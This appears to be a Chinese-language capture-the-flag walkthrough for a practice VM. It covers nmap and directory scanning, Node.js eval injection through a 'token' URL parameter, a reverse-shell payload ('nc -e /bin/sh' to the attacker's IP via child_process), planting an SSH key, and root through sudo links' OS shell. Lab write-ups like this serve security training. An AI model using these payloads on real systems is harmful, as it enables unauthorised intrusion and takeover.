## 靶机地址

[Proton Drive](https://drive.proton.me/urls/QD1XJVR2HM#pa5ZEZ8FnfTA)

![image-20250324191844571](assets/image-20250324191844571.png)



## 信息收集

### nmap扫描

#### 准备阶段

![image-20250324191917493](assets/image-20250324191917493.png)

创建文件夹，用来存放nmap扫描结果



#### 主机探测

```
nmap -sn 192.168.1.0/24
```

![image-20250324191946646](assets/image-20250324191946646.png)

确定靶机ip：

192.168.1.9



#### 端口扫描

```
nmap --min-rate 10000 -p- -sT 192.168.1.9 -oA ./nmapscan/ports
```

![image-20250324192046572](assets/image-20250324192046572.png)

开放了：

- 22 ssh
- 80 http
- 5000 不确定



#### 提取端口信息

```
ports
```

![image-20250324192107666](assets/image-20250324192107666.png)



#### 详细结果扫描

```
nmap -sT -sC -sV -O -p 22,80,5000 192.168.1.9 -oA ./nmapscan/detail
```

![image-20250324192155922](assets/image-20250324192155922.png)

分析：

- 22 open ssh OpenSSH 9.2p1 
- Debian
- 80 http Apache httpd 2.4.57 
- 5000 http Node.js



### 80端口

#### 访问192.168.1.9

![image-20250324192303735](assets/image-20250324192303735.png)

apache主页

查看源码无内容



#### dirsearch扫描目录

```
dirsearch -u http://192.168.1.9
```

![image-20250324192358962](assets/image-20250324192358962.png)

![image-20250324192403175](assets/image-20250324192403175.png)



#### 访问images

![image-20250324192450414](assets/image-20250324192450414.png)



#### 只有一个logo图像

![image-20250324192443965](assets/image-20250324192443965.png)



#### gobuster扫描目录

```
gobuster dir -u http://192.168.1.9 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

![image-20250324192548761](assets/image-20250324192548761.png)

无内容





### 5000端口

#### 访问192.168.1.9:5000

![image-20250324192634317](assets/image-20250324192634317.png)



#### 随便输入内容

![image-20250324192645330](assets/image-20250324192645330.png)

观察url

存在name和token



#### 修改token

![image-20250324192921456](assets/image-20250324192921456.png)

![image-20250324192941343](assets/image-20250324192941343.png)

当token为字母时报错

![image-20250324193118384](assets/image-20250324193118384.png)

存在aleister用户

根据报错

```
q is not defined
```

且存在eval函数

可能存在rce



#### 反弹shell

##### 本地开启监听

```
nc -lvp 283
```

![image-20250324195329674](assets/image-20250324195329674.png)

```
http://192.168.1.9:5000/?name=123&token=require(%27child_process%27).exec(%27nc%20-e%20/bin/sh%20192.168.1.3%20283%27)
```

![image-20250324195333676](assets/image-20250324195333676.png)

成功得到shell



## 提权

### script转换终端

```
/usr/bin/script -qc /bin/bash /dev/null
```

![image-20250324195402065](assets/image-20250324195402065.png)



### 执行sudo -l

```
sudo -l
```

![image-20250324195424455](assets/image-20250324195424455.png)

无密码执行links

（我这里执行links会出现乱码，因此我尝试ssh登录）



### ssh登录

首先进入aleister家目录下

创建.ssh文件夹

任何将自己的公钥文件拷贝到当前文件夹

![image-20250324195730457](assets/image-20250324195730457.png)

![image-20250324195624134](assets/image-20250324195624134.png)

![image-20250324195713830](assets/image-20250324195713830.png)

![image-20250324195740212](assets/image-20250324195740212.png)



然后ssh登录

```
ssh aleister@192.168.1.9 -i id_rsa
```

![image-20250324195806728](assets/image-20250324195806728.png)

### 重新执行links

```
sudo links
```

![image-20250324195836488](assets/image-20250324195836488.png)

按esc

![image-20250324195845696](assets/image-20250324195845696.png)

选中File

![image-20250324195859715](assets/image-20250324195859715.png)

选中OS shell

成功提权

![image-20250324195926375](assets/image-20250324195926375.png)



### 成功得到flag

![image-20250324195939378](assets/image-20250324195939378.png)

